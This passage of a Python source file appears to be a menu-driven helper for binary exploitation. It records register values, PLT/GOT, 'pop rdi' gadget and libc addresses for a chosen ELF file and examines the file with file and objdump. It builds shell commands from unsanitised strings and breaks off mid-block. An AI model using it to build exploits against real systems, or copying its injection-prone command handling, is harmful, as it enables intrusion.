HED1[8]  = spacePadding(" PUTPLT ADDRESS ", COL1+2)   
HED1[9]  = spacePadding(" PUTGOT ADDRESS ", COL1+2)
HED1[10] = spacePadding(" POPRDI ADDRESS ", COL1+2)
HED1[11] = spacePadding(" LIBC   ADDRESS ", COL1+2)   
   
HED2[0]  = spacePadding(" RAX/EAX/AX/AH  ", COL1+2)
HED2[1]  = spacePadding(" RBX/EBX/BX/BH  ", COL1+2)
HED2[2]  = spacePadding(" RCX/ECX/CX/CH  ", COL1+2)
HED2[3]  = spacePadding(" RDX/EDX/DX/DH  ", COL1+2)
HED2[4]  = spacePadding(" RSI/ESI/SI/SL  ", COL1+2)
HED2[5]  = spacePadding(" RDI/EDI/DI/DL  ", COL1+2)
HED2[6]  = spacePadding(" RSP/ESP/SP/SL  ", COL1+2)
HED2[7]  = spacePadding(" RBP/EBP/BP/BL  ", COL1+2)
HED2[8]  = spacePadding(" RIP/EIP        ", COL1+2)
HED2[8]  = spacePadding(" RIP/EIP        ", COL1+2)
HED2[9]  = spacePadding(" PIE   ADDRESS  ", COL1+2)
HED2[10] = spacePadding(" START ADDRESS  ", COL1+2)
HED2[11] = spacePadding(" MAIN  ADDRESS  ", COL1+2)

HED3[0]  = "NAME   "
HED3[1]  = "FORMAT "
HED3[2]  = "MODE   "
HED3[3]  = "ARCHIT "
HED3[4]  = "FLAVOUR"
HED3[5]  = "BITS   "
HED3[6]  = "INDIAN "
HED3[7]  = "LIBC   "
HED3[8]  = "<======"
HED3[9]  = "GADGETS"
HED3[10] = "I.P.   "
HED3[11] = "PORT   "

HED4[0]  = "RELRO  "
HED4[1]  = "STACK  "
HED4[2]  = "FORTIFY"
HED4[3]  = "NX     "
HED4[4]  = "PIE    "
HED4[5]  = "RWX    "
HED4[6]  = "OFFSET "
HED4[7]  = "       "
HED4[8]  = "======="
HED4[9]  = "       "
HED4[10] = "       "
HED4[11] = "       "

# TEMPORAY DEFUALT VALUES

DATA[0]  = spacePadding("unknown", COL1)
DATA[1]  = spacePadding("unknown", COL1)
DATA[2]  = spacePadding("unknown", COL1)
DATA[3]  = spacePadding("unknown", COL1)
DATA[4]  = spacePadding(flavour, COL1)
DATA[5]  = spacePadding("unknown", COL1)
DATA[6]  = spacePadding("unknown", COL1)
DATA[7]  = spacePadding("unknown", COL1)
DATA[8]  = "="*COL1
DATA[9]  = spacePadding("0", COL1)
DATA[10] = spacePadding("0", COL1)
DATA[11] = spacePadding("0", COL1)

CSEC[0]  = spacePadding("unknown", COL1)
CSEC[1]  = spacePadding("unknown", COL1)
CSEC[2]  = spacePadding("unknown", COL1)
CSEC[3]  = spacePadding("unknown", COL1)
CSEC[4]  = spacePadding("unknown", COL1)
CSEC[5]  = spacePadding("unknown", COL1)
CSEC[6]  = spacePadding("0", COL1)
CSEC[7]  = spacePadding("0", COL1)
CSEC[8]  = spacePadding("0", COL1)
CSEC[9]  = spacePadding(" ", COL1)
CSEC[10] = spacePadding(" ", COL1)
CSEC[11] = spacePadding(" ", COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
command("echo " + col[1]  + " | base64 -d >  ascii.tmp")	#REG1
command("echo " + col[2]  + " | base64 -d >  ascii.tmp")
command("echo " + col[3]  + " | base64 -d >  ascii.tmp")
command("echo " + col[4]  + " | base64 -d >  ascii.tmp")
command("echo " + col[5]  + " | base64 -d >  ascii.tmp")
command("echo " + col[6]  + " | base64 -d >  ascii.tmp")
command("echo " + col[7]  + " | base64 -d >  ascii.tmp")
command("echo " + col[8]  + " | base64 -d >  ascii.tmp")
command("echo " + col[9]  + " | base64 -d >  ascii.tmp")
command("echo " + col[10]  + " | base64 -d >  ascii.tmp")
command("echo " + col[11]  + " | base64 -d >  ascii.tmp")
command("echo " + col[12]  + " | base64 -d >  ascii.tmp")
command("echo " + col[13]  + " | base64 -d >  ascii.tmp")	#REG2
command("echo " + col[14]  + " | base64 -d >  ascii.tmp")
command("echo " + col[15]  + " | base64 -d >  ascii.tmp")
command("echo " + col[16]  + " | base64 -d >  ascii.tmp")
command("echo " + col[17]  + " | base64 -d >  ascii.tmp")
command("echo " + col[18]  + " | base64 -d >  ascii.tmp")
command("echo " + col[19]  + " | base64 -d >  ascii.tmp")
command("echo " + col[20]  + " | base64 -d >  ascii.tmp")
command("echo " + col[21]  + " | base64 -d >  ascii.tmp")
command("echo " + col[22]  + " | base64 -d >  ascii.tmp")
command("echo " + col[23]  + " | base64 -d >  ascii.tmp")
command("echo " + col[24]  + " | base64 -d >  ascii.tmp")
command("echo " + col[25]  + " | base64 -d >  ascii.tmp")	#DATA
command("echo " + col[26]  + " | base64 -d >  ascii.tmp")
command("echo " + col[27]  + " | base64 -d >  ascii.tmp")
command("echo " + col[28]  + " | base64 -d >  ascii.tmp")
command("echo " + col[29]  + " | base64 -d >  ascii.tmp")
command("echo " + col[30]  + " | base64 -d >  ascii.tmp")
command("echo " + col[31]  + " | base64 -d >  ascii.tmp")
command("echo " + col[32]  + " | base64 -d >  ascii.tmp")
command("echo " + col[33]  + " | base64 -d >  ascii.tmp")
command("echo " + col[34]  + " | base64 -d >  ascii.tmp")
command("echo " + col[35]  + " | base64 -d >  ascii.tmp")
command("echo " + col[36]  + " | base64 -d >  ascii.tmp")
command("echo " + col[37]  + " | base64 -d >  ascii.tmp")	#CSEC
command("echo " + col[38]  + " | base64 -d >  ascii.tmp")
command("echo " + col[39]  + " | base64 -d >  ascii.tmp")
command("echo " + col[40]  + " | base64 -d >  ascii.tmp")
command("echo " + col[41]  + " | base64 -d >  ascii.tmp")
command("echo " + col[42]  + " | base64 -d >  ascii.tmp")
command("echo " + col[43]  + " | base64 -d >  ascii.tmp")
command("echo " + col[44]  + " | base64 -d >  ascii.tmp")
command("echo " + col[45]  + " | base64 -d >  ascii.tmp")
command("echo " + col[46]  + " | base64 -d >  ascii.tmp")
command("echo " + col[47]  + " | base64 -d >  ascii.tmp")
command("echo " + col[48]  + " | base64 -d >  ascii.tmp")

REG1_0 = linecache.getline("ascii.tmp", 1).rstrip("\n")
REG1_1 = linecache.getline("ascii.tmp", 2).rstrip("\n")
REG1_2 = linecache.getline("ascii.tmp", 3).rstrip("\n")
REG1_3 = linecache.getline("ascii.tmp", 4).rstrip("\n")
REG1_4 = linecache.getline("ascii.tmp", 5).rstrip("\n")
REG1_5 = linecache.getline("ascii.tmp", 6).rstrip("\n")
REG1_6 = linecache.getline("ascii.tmp", 7).rstrip("\n")
REG1_7 = linecache.getline("ascii.tmp", 8).rstrip("\n")
REG1_8 = linecache.getline("ascii.tmp", 9).rstrip("\n")
REG1_9 = linecache.getline("ascii.tmp", 10).rstrip("\n")
REG1_10 = linecache.getline("ascii.tmp", 11).rstrip("\n")
REG1_11 = linecache.getline("ascii.tmp", 12).rstrip("\n")
REG2_0 = linecache.getline("ascii.tmp", 13).rstrip("\n")
REG2_1 = linecache.getline("ascii.tmp", 14).rstrip("\n")
REG2_2 = linecache.getline("ascii.tmp", 15).rstrip("\n")
REG2_3 = linecache.getline("ascii.tmp", 16).rstrip("\n")
REG2_4 = linecache.getline("ascii.tmp", 17).rstrip("\n")
REG2_5 = linecache.getline("ascii.tmp", 18).rstrip("\n")
REG2_6 = linecache.getline("ascii.tmp", 19).rstrip("\n")
REG2_7 = linecache.getline("ascii.tmp", 20).rstrip("\n")
REG2_8 = linecache.getline("ascii.tmp", 21).rstrip("\n")
REG2_9 = linecache.getline("ascii.tmp", 22).rstrip("\n")
REG2_10 = linecache.getline("ascii.tmp", 23).rstrip("\n")
REG2_11 = linecache.getline("ascii.tmp", 24).rstrip("\n")
DATA_0 = linecache.getline("ascii.tmp", 25).rstrip("\n")
DATA_1 = linecache.getline("ascii.tmp", 26).rstrip("\n")
DATA_2 = linecache.getline("ascii.tmp", 27).rstrip("\n")
DATA_3 = linecache.getline("ascii.tmp", 28).rstrip("\n")
DATA_4 = linecache.getline("ascii.tmp", 29).rstrip("\n")
DATA_5 = linecache.getline("ascii.tmp", 30).rstrip("\n")
DATA_6 = linecache.getline("ascii.tmp", 31).rstrip("\n")
DATA_7 = linecache.getline("ascii.tmp", 32).rstrip("\n")
DATA_8 = linecache.getline("ascii.tmp", 33).rstrip("\n")
DATA_9 = linecache.getline("ascii.tmp", 34).rstrip("\n")
DATA_10 = linecache.getline("ascii.tmp", 35).rstrip("\n")
DATA_11 = linecache.getline("ascii.tmp", 36).rstrip("\n")
CSEC_0 = linecache.getline("ascii.tmp", 37).rstrip("\n")
CSEC_1 = linecache.getline("ascii.tmp", 38).rstrip("\n")
CSEC_2 = linecache.getline("ascii.tmp", 39).rstrip("\n")
CSEC_3 = linecache.getline("ascii.tmp", 40).rstrip("\n")
CSEC_4 = linecache.getline("ascii.tmp", 41).rstrip("\n")
CSEC_5 = linecache.getline("ascii.tmp", 42).rstrip("\n")
CSEC_6 = linecache.getline("ascii.tmp", 43).rstrip("\n")
CSEC_7 = linecache.getline("ascii.tmp", 44).rstrip("\n")
CSEC_8 = linecache.getline("ascii.tmp", 45).rstrip("\n")
CSEC_9 = linecache.getline("ascii.tmp", 46).rstrip("\n")
CSEC_10 = linecache.getline("ascii.tmp", 47).rstrip("\n")
CSEC_11 = linecache.getline("ascii.tmp", 48).rstrip("\n")

REG1_0 = spacePadding(REG1_0, COL1)
REG1_1 = spacePadding(REG1_1, COL1)
REG1_2 = spacePadding(REG1_2, COL1)
REG1_3 = spacePadding(REG1_3, COL1)
REG1_4 = spacePadding(REG1_4, COL1)
REG1_5 = spacePadding(REG1_5, COL1)
REG1_6 = spacePadding(REG1_6, COL1)
REG1_7 = spacePadding(REG1_7, COL1)
REG1_8 = spacePadding(REG1_8, COL1)
REG1_9 = spacePadding(REG1_9, COL1)
REG1_10 = spacePadding(REG1_10, COL1)
REG1_11 = spacePadding(REG1_11, COL1)
REG2_0 = spacePadding(REG2_0, COL1)
REG2_1 = spacePadding(REG2_1, COL1)
REG2_2 = spacePadding(REG2_2, COL1)
REG2_3 = spacePadding(REG2_3, COL1)
REG2_4 = spacePadding(REG2_4, COL1)
REG2_5 = spacePadding(REG2_5, COL1)
REG2_6 = spacePadding(REG2_6, COL1)
REG2_7 = spacePadding(REG2_7, COL1)
REG2_8 = spacePadding(REG2_8, COL1)
REG2_9 = spacePadding(REG2_9, COL1)
REG2_10 = spacePadding(REG2_10, COL1)
REG2_11 = spacePadding(REG2_11, COL1)
DATA_0 = spacePadding(DATA_0, COL1)
DATA_1 = spacePadding(DATA_1, COL1)
DATA_2 = spacePadding(DATA_2, COL1)
DATA_3 = spacePadding(DATA_3, COL1)
DATA_4 = spacePadding(DATA_4, COL1)
DATA_5 = spacePadding(DATA_5, COL1)
DATA_6 = spacePadding(DATA_6, COL1)
DATA_7 = spacePadding(DATA_7, COL1)
DATA_8 = spacePadding(DATA_8, COL1)
DATA_9 = spacePadding(DATA_9, COL1)
DATA_10 = spacePadding(DATA_10, COL1)
DATA_11 = spacePadding(DATA_11, COL1)
CSEC_0 = spacePadding(CSEC_0, COL1)
CSEC_1 = spacePadding(CSEC_1, COL1)
CSEC_2 = spacePadding(CSEC_2, COL1)
CSEC_3 = spacePadding(CSEC_3, COL1)
CSEC_4 = spacePadding(CSEC_4, COL1)
CSEC_5 = spacePadding(CSEC_5, COL1)
CSEC_6 = spacePadding(CSEC_6, COL1)
CSEC_7 = spacePadding(CSEC_7, COL1)
CSEC_8 = spacePadding(CSEC_8, COL1)
CSEC_9 = spacePadding(CSEC_9, COL1)
CSEC_10 = spacePadding(CSEC_10, COL1)
CSEC_11 = spacePadding(CSEC_11, COL1)

command("sleep 5s")
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   clearClutter()
   checkParams = 0							# RESET'S VALUE
   command("clear")							# CLEARS SCREEN
   dispMenu()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Secret option that will run all commands.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      pass
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set accumulator address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='1':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[0]
         REG1[0] = input("[?] Please enter address: ")
         if REG1[0] != "":
            REG1[0] = bulkAddress(REG1[0])
            REG1[0] = spacePadding(REG1[0],COL1)
         else:
            REG1[0] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set base pointer address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='2':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[1]
         REG1[1] = input("[?] Please enter address: ")
         if REG1[1] != "":
            REG1[1] = bulkAddress(REG1[1])
            REG1[1] = spacePadding(REG1[1],COL1)
         else:
            REG1[1] = BAK
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set loop counter address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='3':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[2]
         REG1[2] = input("[?] Please enter address: ")
         if REG1[2] != "":
            REG1[2] = bulkAddress(REG1[2])
            REG1[2] = spacePadding(REG1[2],COL1)
         else:
            REG1[2] = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set data location address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='4':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[3]
         REG1[3] = input("[?] Please enter address: ")
         if REG1[3] != "":
            REG1[3] = bulkAddress(REG1[3])
            REG1[3] = spacePadding(REG1[3],COL1)
         else:
            REG1[3] = BAK
      prompt()
           
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set source index address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='5':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[4]
         REG1[4] = input("[?] Please enter address: ")
         if REG1[4] != "":
            REG1[4] = bulkAddress(REG1[4])
            REG1[4] = spacePadding(REG1[4],COL1)
         else:
            REG1[4] = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set destination address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='6':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[5]
         REG1[5] = input("[?] Please enter address: ")
         if REG1[5] != "":
            REG1[5] = bulkAddress(REG1[5])
            REG1[5] = spacePadding(REG1[5],COL1)
         else:
            REG1[5] = BAK
         prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set stack pointer.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='7':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[6]
         REG1[6] = input("[?] Please enter address: ")
         if REG1[6] != "":      
            REG1[6] = bulkAddress(REG1[6])
            REG1[6] = spacePadding(REG1[6],COL1)
         else:
            REG1[6] = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set base pointer.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='8':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[7]
         REG1[7] = input("[?] Please enter address: ")
         if REG1[7] != "":
            REG1[7] = bulkAddress(REG1[7])
            REG1[7] = spacePadding(REG1[7],COL1)
         else:
            REG1[7] = BAK
      prompt()     
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set instruction pointer address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='9':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[8]
         REG1[8] = input("[?] Please enter address: ")
         if REG1[8] != "":
            REG1[8] = bulkAddress(REG1[8])
            REG1[8] = spacePadding(REG1[8],COL1)
         else:
            REG1[8] = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - pie address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='10':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[9]
         REG1[9] = input("[?] Please enter address: ")
         if REG1[9] != "":
            REG1[9] = bulkAddress(REG1[9])
            REG1[9] = spacePadding(REG1[9], COL1)
         else:
            REG1[9] = BAK
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - start address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='11':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[10]
         REG1[10] = input("[?] Please enter address: ")
         if REG1[10] != "":      
            REG1[10] = bulkAddress(REG1[10])
            REG1[10] = spacePadding(REG1[10],COL1)
         else:
            REG1[10] = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - main address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='12':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG1[11]
         REG1[11] = input("[?] Please enter address: ")
         if REG1[11] != "":
            REG1[11] = bulkAddress(REG1[11])
            REG1[11] = spacePadding(REG1[11],COL1)
         else:
            REG1[11] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - system address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='13':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[0]
         REG2[0] = input("[?] Please enter address: ")
         if REG2[0] != "":
            REG2[0] = bulkAddress(REG2[0])
            REG2[0] = spacePadding(REG2[0],COL1)
         else:
            REG2[0] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - jump to a function.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='14':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[1]
         REG2[1] = input("[?] Please enter address: ")
         if REG2[1] != "":
            REG2[1] = bulkAddress(REG2[1])
            REG2[1] = spacePadding(REG2[1],COL1)
         else:
            REG2[1] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - overwrite address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='15':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[2]
         REG2[2] = input("[?] Please enter address: ")
         if REG2[2] != "":
            REG2[2] = bulkAddress(REG2[2])
            REG2[2] = spacePadding(REG2[2],COL1)
         else:
            REG2[2] = BAK
      prompt()  
      
 # ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - memory content address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='16':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[3]
         REG2[3] = input("[?] Please enter address: ")
         if REG2[3] != "":
            REG2[3] = bulkAddress(REG2[3])
            REG2[3] = spacePadding(REG2[3],COL1)
         else:
            REG2[3] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='17':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[4]
         REG2[4] = input("[?] Please enter address: ")
         if REG2[4] != "":
            REG2[4] = bulkAddress(REG2[4])
            REG2[4] = spacePadding(REG2[4],COL1)
         else:
            REG2[4] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='18':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[5]
         REG2[5] = input("[?] Please enter address: ")
         if REG2[5] != "":
            REG2[5] = bulkAddress(REG2[5])
            REG2[5] = spacePadding(REG2[5],COL1)
         else:
            REG2[5] = BAK
      prompt()  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='19':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[6]
         REG2[6] = input("[?] Please enter address: ")
         if REG2[6] != "":
            REG2[6] = bulkAddress(REG2[6])
            REG2[6] = spacePadding(REG2[6],COL1)
         else:
            REG2[6] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='20':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[7]
         REG2[7] = input("[?] Please enter address: ")
         if REG2[7] != "":
            REG2[7] = bulkAddress(REG2[7])
            REG2[7] = spacePadding(REG2[7],COL1)
         else:
            REG2[7] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - PUTS@PLT .
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='21':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[8]
         REG2[8] = input("[?]  Please enter address: ")
         if REG2[8] != "":      
            REG2[8] = bulkAddress(REG2[8])
            REG2[8] = spacePadding(REG2[8],COL1)
         else:
            REG2[8] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - PUTS@GOT.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='22':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[9]
         REG2[9] = input("[?] Please enter address: ")
         if REG2[9] != "":
            REG2[9] = bulkAddress(REG2[9])
            REG2[9] = spacePadding(REG2[9],COL1)
         else:
            REG2[9] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set pop rdi; ret.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='23':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[10]
         REG2[10] = input("[?] Please enter address: ")
         if REG2[10] != "":
            REG2[10] = bulkAddress(REG2[10])
            REG2[10] = spacePadding(REG2[10],COL1)
         else:
            REG2[10] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - LibC address
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='24':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = REG2[11]
         REG2[11] = input("[?] Please enter address: ")
         if REG2[11] != "":      
            REG2[11] = bulkAddress(REG2[11])
            REG2[11] = spacePadding(REG2[11],COL1)
         else:
            REG2[11] = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      print(colored("[*] Scanning files in " + localDir + " directory...", colour3))
      command("ls -la " + localDir + " > dir.tmp")
      for loop in range(3):
         command("sed -i '1d' dir.tmp")
      command("sed -i '/RA.db/d' dir.tmp")
      count = lineCount("dir.tmp")        
      if count < 1:
         print("[-] The directory is empty...")
      else:
         catsFile("dir.tmp")
         BAK = DATA[0]
         DATA[0] = input("[?] Please enter filename: ")
         if DATA[0] != "":
            if os.path.exists(localDir + "/" + DATA[0].rstrip(" ")):
               command("chmod -x " + localDir + "/" + DATA[0].rstrip(" "))
               DATA[0] = spacePadding(DATA[0],COL1)
               DATA[2] = spacePadding("static", COL1)
            else:
               print("[-] I could not find the file name you entered, did you spell it correctly?...")
               DATA[0] = BAK
         else:
            DATA[0] = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Switch modes.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='26':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[2].rstrip(" ") == "static":
            command("chmod +x " + localDir + "/" + DATA[0].rstrip(" "))
            DATA[2] = spacePadding("dynamic", COL1)
         else:
            command("chmod -x " + localDir + "/" + DATA[0].rstrip(" "))
            DATA[2] = spacePadding("static", COL1)
      print(colored("[*] File mode switched to " + DATA[2].rstrip(" ") + "...", colour3))
      prompt()                              

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Gather data from file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='27':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))         
         command("file " + localDir + "/" + DATA[0].rstrip(" ") + " > file.tmp")
         command("objdump" + " -f " + localDir + "/" + DATA[0].rstrip(" ") + " > headers.tmp")
         cutLine(localDir, "headers.tmp")        
         command("cat file.tmp > combined.tmp")
         command("cat headers.tmp >> combined.tmp")
         parsFile("combined.tmp")
         catsFile("combined.tmp")                  
         with open("combined.tmp") as read:
            for binary in read:
               if "ELF" in binary:
                  DATA[1] = spacePadding("elf", COL1)
                  print("Linux binary file...")         
               if "8-bit" in binary:
                  BIT = "08"
                  print(BIT + "-bit architecture...")           
                  DATA[5] = spacePadding(BIT, COL1)  
               if "16-bit" in binary:
                  BIT = "16"
                  print(BIT + "-bit architecture...")           
                  DATA[5] = spacePadding(BIT, COL1)  
               if "32-bit" in binary:
                  BIT = "32"
                  print(BIT + "-bit architecture...")           
                  DATA[5] = spacePadding(BIT, COL1)         
                  CSEC[7] = spacePadding("-4", COL1) 
                  CSEC[8] = spacePadding("-4", COL1)                   
               if "64-bit" in binary:
                  BIT = "64"
                  print(BIT + "-bit architecture...")  
                  DATA[5] = spacePadding(BIT, COL1)      
                  CSEC[7] = spacePadding("-8", COL1)   
                  CSEC[8] = spacePadding("-8", COL1)                    
               if "LSB" in binary:
                  IND = "little"
                  print(IND + " indian format...")
                  DATA[6] = spacePadding(IND, COL1)
               if "MSB" in binary:
                  IND = "big"
                  print(IND + " indian...")
                  DATA[6] = spacePadding(IND, COL1)
               if "not stripped" in binary:
                  print("Debugging information built in...")
               else:
                  if "stripped" in binary:
